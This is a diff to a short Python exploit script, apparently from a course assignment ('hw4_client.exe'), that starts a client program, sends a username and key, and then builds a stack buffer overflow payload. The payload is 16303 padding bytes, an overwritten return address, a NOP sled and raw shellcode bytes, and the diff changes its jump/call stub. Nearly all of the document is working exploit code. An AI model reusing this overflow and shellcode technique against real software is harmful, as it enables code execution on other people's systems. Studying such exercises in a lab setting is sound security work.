@@ -1,11 +1,10 @@
 from subprocess import Popen, PIPE, STDOUT
 
-length = 5000
 if __name__ == '__main__':
     p = Popen(['hw4_client.exe'], stdin=PIPE)
     introduction = b"archer\n2BBVAFEX2RNFB2NF\nPEEK\n"
-    override = b"\0" + b"a" * 16303 + b'\x28\x20\x50\x62'
-    package = b""
+    override = b"\x00" + b"a" * 16303 + b'\x28\x20\x50\x62'
+    package = b"\xeb\x20\x90\x90\xe8\xdc\x5f\x00"
     package += b"\x90" * 32
     package += b"\x81\xEC\x00\x40\x00\x00"
     package += b"\x89\xE2"
@@ -26,6 +25,8 @@ if __name__ == '__main__':
     user_input = ""
     while user_input != "exit":
         user_input = input("\nPEEK_INPUT>>")
+        p.stdin.flush()
         p.stdin.write(user_input.encode()+b"\n")
+        p.stdin.flush()
 
     p.kill()
